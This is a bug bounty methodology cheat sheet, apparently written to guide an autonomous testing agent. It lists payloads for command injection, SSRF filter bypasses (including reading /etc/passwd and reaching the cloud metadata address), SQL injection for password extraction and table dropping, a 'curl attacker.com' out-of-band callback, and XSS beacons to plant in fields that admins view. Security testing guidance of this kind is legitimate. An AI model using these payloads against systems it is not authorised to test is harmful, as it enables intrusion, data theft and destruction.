# 06 — Hunt Webapp: High-Value Classes (RCE, SSRF, SQLi, IDOR, XSS)

Distilled from `hunt-rce`, `hunt-ssrf`, `hunt-sqli`, `hunt-idor`, `hunt-xss`. These 5 classes command the highest payouts.

---

## RCE (Remote Code Execution) — 67 disclosed reports

**Highest payouts in bug bounty.** Blast radius is infrastructure-wide.

### Autonomous Testing Priority
Content-type is the #1 silent failure mode for command injection. If the page has an HTML form, use form-encoding. If the path is `/api/...` or response is JSON, use JSON.

### Command Injection Operators (by prevalence)
```
value;id        ← Unix semicolon (most common)
value|id        ← pipe
value&&id       ← AND
value$(id)      ← subshell
value`id`       ← backtick
```

### Crown Jewel Targets
- Enterprise server products (GitHub Enterprise, GitLab)
- Supply chain / package registries (npm, PyPI dependency confusion)
- Cloud-native infrastructure (K8s API, CI/CD pipelines)
- Admin/management consoles (template injection → root)

### Key Attack Surfaces
```
/management-console/*  /admin/settings/*  /api/v*/exec  /api/v*/run
/webhook/*  /_internal/*  /import?url=  /render?template=  /preview?format=
```

---

## SSRF (Server-Side Request Forgery) — 15 disclosed reports

### OOB-Or-It-Didn't-Happen Gate

**Claims of blind SSRF require out-of-band confirmation. Always. No exceptions.**

What is NOT confirmation:
- Server echoing your URL in an error message (string formatting, not network)
- Different status codes for external vs localhost (URL validators, not fetching)
- Delayed response (DNS resolution attempts, not completed HTTP fetches)

What IS confirmation:
- DNS lookup for your unique Collaborator subdomain
- HTTP request to your Collaborator endpoint with server's IP/User-Agent

### Default Workflow
1. Plant Collaborator payload first — verify listener reports queried subdomain
2. Send request to target endpoint
3. Wait 30–120 seconds, poll OOB listener
4. Only after confirmed callback → claim SSRF
5. Zero callbacks → retract claim, even if error messages echo URLs

### Attribute callback to ONE parameter
```
BAD:  four fields, one payload, one batch → attribution impossible
GOOD: fresh payload per field, one request each → url=→callback, apiUrl=→none
```

### Crown Jewel Targets
- Cloud-hosted SaaS (AWS IMDSv1, GCP metadata `169.254.169.254`)
- Kubernetes/orchestration platforms
- Link preview / URL fetching features
- Dataset/file import pipelines

### 11 SSRF Bypass Techniques
(For network-level filtering)
- IPv6 notation: `[::1]` or `[0:0:0:0:0:0:0:1]`
- Decimal IP: `2130706433` = `127.0.0.1`
- Octal IP: `0177.0.0.1`
- DNS rebinding: initial resolve → valid IP, cached resolve → internal IP
- Protocol smuggling: `gopher://` to Redis, `file:///etc/passwd`
- URL schema bypass: `http://127.0.0.1` vs `http://localhost`
- IPv4-mapped IPv6: `::ffff:127.0.0.1`

---

## SQL Injection — 12+ disclosed reports

### Error vs Blind Decision Flow
1. **Error-based** first: `'`, `"`, `{{7*7}}` → watch for 500/stack traces
2. **Time-based**: `SLEEP(10)`, `; sleep 10;` → watch response time
3. **OOB**: `curl attacker.com`, interactsh → DNS callback
4. **Boolean**: `AND 1=1` vs `AND 1=0` → content-length diff

### Key Patterns
- UNION-based: ` UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`
- Blind char-by-char: `AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'`
- Stacked queries: `'; DROP TABLE users;--` (rare in modern apps)

---

## IDOR (Insecure Direct Object Reference) — 26 disclosed reports

### Detection Patterns
- Sequential IDs: `/api/users/123` → try `/api/users/124`
- UUIDs in requests: check if another user's UUID works
- Parameter tampering: `user_id=me` → `user_id=admin`

### Test Method
1. Create two test accounts (A and B)
2. Make request as user A for user B's resource
3. If user A can access user B's data → IDOR confirmed

### Bypass Techniques
- HTTP method swap: GET → PUT, POST → PATCH
- Array wrap: `user_id[]=123` → `user_id[]=456`
- GraphQL node() resolver: `node(id: base64("User:456"))`
- JSON vs form-encoded parameter confusion

---

## XSS (Cross-Site Scripting) — 174 disclosed reports

### Autonomous Testing Priority
**Verify reflection before claiming XSS — encoding is everything.** Your payload must appear in the response with angle brackets UNESCAPED.

**Use a UNIQUE NUMERIC CANARY** — e.g. `<script>alert(91234)</script>` — not `alert(1)`.

### Injection Contexts (try in order)
1. **Inline script injection**: `<script>alert(CANARY)</script>`
2. **Attribute event injection**: `" onmouseover="alert(CANARY)`
3. **URL/href context**: `javascript:alert(CANARY)`

### Distinguishing success from failure
- **Vulnerable**: response contains `<script>alert(` unescaped
- **Filtered/safe**: `&lt;script&gt;` or `&#x3C;script&#x3E;`
- **Blocked**: error or reflected value absent

### Crown Jewel Targets
- Admin panels and authenticated dashboards
- Payment/financial flows
- Stored XSS in collaborative features (wikis, markdown, issues)
- SSO/signin pages
- Shared SaaS tenant surfaces

### OOB-Or-It-Didn't-Happen Gate (Blind/Stored XSS)
Claims require OOB confirmation:
- Collaborator subdomain request arrives after payload stored/reflected
- User-Agent of firing request is a browser (not server's HTTP client)
- For stored XSS: request arrives hours/days later when admin views resource

### Where to plant blind-XSS beacons
Any field viewed in admin UI / log viewer / email / report:
- Support ticket body/description
- User profile fields (bio, company name)
- Feedback forms
- Error-reporting fields
- Login attempt logs (email field)

---

*Source: hunt-rce (493 lines), hunt-ssrf (491 lines), hunt-idor, hunt-sqli, hunt-xss (449 lines)*
